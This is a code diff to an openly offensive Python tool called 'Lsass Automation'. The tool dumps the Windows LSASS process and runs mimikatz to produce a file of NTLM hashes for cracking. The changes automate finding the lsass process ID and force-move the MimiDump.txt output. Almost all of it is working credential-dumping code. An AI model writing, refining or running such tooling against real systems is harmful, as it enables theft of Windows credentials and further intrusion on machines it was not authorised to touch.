@@ -19,7 +19,7 @@ $$ |       $$  $$<  $$ |  $$ | $$ |$$\ $$ |$$ |
 $$$$$$$$\ $$  /\$$\ \$$$$$$  | \$$$$  |$$ |\$$$$$$$\ 
 \________|\__/  \__| \______/   \____/ \__| \_______|
                                                      
-Lsass Automation! Made by Exotic!! v1.1                                                     
+Lsass Automation! Made by Exotic!! v1.2                                                     
                                                      
 """
     return banner
@@ -56,8 +56,7 @@ def is_admin():
 def lsass_extract(current_dir):
     print("[+] Starting Dumping lsass process")
     print("[*] Looking for the lsass Process")
-    os.system("powershell.exe Get-Process lsass")
-    lsass_pid = int(input("\n[?] What is the lsass PID? "))
+    lsass_pid = int(subprocess.run('powershell.exe (Get-Process lsass).Id' ,shell = True, text = True, capture_output = True).stdout)
     print("[*] Executing Dumping for the lsass Process to current directory")
     try:
         os.chdir('c:\\windows\\system32')
@@ -95,7 +94,7 @@ def mimikatz_dumping(lsass_path, current_dir):
         status = True
         t.join()
         time.sleep(1.5)
-        os.system(f'powershell mv MimiDump.txt {current_dir}')
+        os.system(f'powershell mv -Force MimiDump.txt {current_dir}')
         print('[+] MimiDump.txt file was created successfuly to crack the NTLM Hash!')
     except Exception as e:
         print('[-] Something went Wrong: ',e)
